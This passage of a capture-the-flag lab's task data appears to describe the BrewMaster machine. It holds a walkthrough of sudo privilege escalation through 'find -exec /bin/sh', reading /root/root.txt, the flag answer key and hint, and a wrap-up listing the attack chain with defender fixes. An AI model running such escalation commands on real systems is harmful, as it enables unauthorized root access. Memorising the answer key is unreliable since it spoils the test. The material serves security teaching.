+        "Question": "<p style=\"font-size:12pt;\">Being able to run <code>find</code> as root is all we need. <code>find</code> can execute commands with its <code>-exec</code> option - and because sudo runs it as root, that command also runs as root.</p>\n<h3>Background</h3>\n<p style=\"font-size:12pt;\"><strong>GTFOBins</strong> is a catalogue of ordinary binaries that can be abused to break out of restricted contexts. The <code>find</code> entry shows the exact sudo escape used below.</p>\n<p style=\"font-size:12pt;\"><strong>Goal:</strong> Become root and read the root flag.</p>\n<p style=\"font-size:12pt;\"><strong>Tool: <code>find</code></strong> (via its <code>-exec</code> action).</p>\n<h3>Step-by-Step</h3>\n<ol>\n<li style=\"font-size:12pt;\">Use find to spawn a root shell:</li>\n</ol>\n<pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ sudo find . -exec /bin/sh \\; -quit</code></pre>\n<ol>\n<li style=\"font-size:12pt;\">Confirm root and read the flag:</li>\n</ol>\n<pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ id</code></pre>\n<pre class=\"language-bash\"><code>┌──(kali㉿kali)-[~]\n└─$ cat /root/root.txt</code></pre>\n<p style=\"font-size:12pt;\">Observed result:</p>\n<pre class=\"language-bash\"><code>uid=0(root) gid=0(root) groups=0(root)\nBrewMaster{826d809e611b249613b1ec33}</code></pre>\n<h4>Command notes</h4>\n<ul>\n<li style=\"font-size:12pt;\"><code>-exec /bin/sh \\;</code> - run a shell for the first match.</li>\n<li style=\"font-size:12pt;\"><code>-quit</code> - stop after the first match so you drop straight into the shell.</li>\n</ul>\n<p style=\"font-size:12pt;\"><strong>Submit the root flag from <code>/root/root.txt</code>.</strong></p>\n<p style=\"font-size:12pt;\"><em>Answer format:</em> <code>BrewMaster{...}</code></p>",
+        "Answer": "[{\"value\":\"BrewMaster{826d809e611b249613b1ec33}\",\"__isValid\":true,\"__tagId\":\"909a8630-3f68-48fe-8faa-2ea2e8d79c8f\"}]",
+        "Camouflage": "[]",
+        "Category": "13",
+        "Task_Type": "1",
+        "Score": "25",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [
+          {
+            "id": 10114,
+            "text": "GTFOBins 'find': sudo find . -exec /bin/sh \\; -quit  then cat /root/root.txt.",
+            "penalty": 5
+          }
+        ],
+        "Choices": []
+      },
+      {
+        "id": 9369,
+        "text": "Wrap-Up and Remediation",
+        "type": "task",
+        "Question_Title": "Wrap-Up and Remediation",
+        "Question": "<h2>Nicely done - you rooted BrewMaster!</h2><p style=\"font-size:12pt;\">You chained six small mistakes into full compromise. Here is the path and how a defender should close each gap.</p><h3>Attack chain recap</h3><ol><li style=\"font-size:12pt;\">nmap found FTP, SSH and HTTP.</li><li style=\"font-size:12pt;\">Anonymous FTP leaked an internal memo (username + hints).</li><li style=\"font-size:12pt;\">robots.txt exposed the hidden staff portal.</li><li style=\"font-size:12pt;\">SQL injection bypassed the login and the dashboard leaked plaintext passwords.</li><li style=\"font-size:12pt;\">A reused password gave an SSH foothold (user flag).</li><li style=\"font-size:12pt;\">A sudo NOPASSWD entry on find gave root (root flag).</li></ol><h3>How to fix it (defender view)</h3><ul><li style=\"font-size:12pt;\">Disable anonymous FTP; do not store internal notes on public services.</li><li style=\"font-size:12pt;\">Use parameterised queries / prepared statements - never build SQL by string concatenation.</li><li style=\"font-size:12pt;\">Never store or display passwords in plaintext; hash them and remove the dashboard leak.</li><li style=\"font-size:12pt;\">Enforce unique passwords per system; no reuse between web app and SSH.</li><li style=\"font-size:12pt;\">Remove the NOPASSWD sudo rule, or restrict it to a specific safe command.</li></ul><h3>MITRE ATT&amp;CK touchpoints</h3><ul><li style=\"font-size:12pt;\">T1190 Exploit Public-Facing Application (SQL injection)</li><li style=\"font-size:12pt;\">T1078 Valid Accounts (credential reuse over SSH)</li><li style=\"font-size:12pt;\">T1548.003 Abuse Elevation Control Mechanism: Sudo (GTFOBins find)</li></ul><p style=\"font-size:12pt;\">No answer required - continue to submit your feedback or reset the lab.</p>",
+        "Answer": "[]",
+        "Camouflage": "[]",
+        "Category": "23",
+        "Task_Type": "5",
+        "Score": "5",
+        "Lose": "0",
+        "PartialCredit": 0,
+        "Visibility": 1,
+        "Hints": [],
+        "Choices": []
+      }
+    ]
+  }
+]
